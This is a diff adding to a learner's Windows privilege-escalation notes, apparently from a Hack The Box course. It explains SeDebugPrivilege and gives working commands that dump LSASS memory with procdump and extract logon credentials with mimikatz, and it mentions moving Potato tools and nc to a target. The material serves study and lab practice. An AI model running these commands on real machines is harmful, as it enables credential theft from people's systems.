@@ -37,3 +37,32 @@ SeImpersonate privileges allows a process to pretend itself to be another accoun
 An example that does not require metasploit is also available at https://academy.hackthebox.com/app/module/67/section/607, but it requires xp_cmdshell and file dropping as we need to transfer https://github.com/ohpe/juicy-potato/releases and nc to target machine, another example of PrintSpoofer and RoguePotato is also available https://academy.hackthebox.com/app/module/67/section/607
 
 Privilege Escalation with SeDebugPrivilege:
+
+User with SeDebugPrivilege are allowed to perform actions against programs for debug purpose, including but not limited to reading, attaching, dumping memories, including process that is critical like LSASS.
+
+We can use procdump.exe from sysinternals to dump process, using LSASS as example:
+```
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+Or we can use other method we know already like taskmgr dumping to create a dump for LSASS, then we can use mimikatz.exe to extract hashes
+```
+C:\htb> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+<snip>
+```
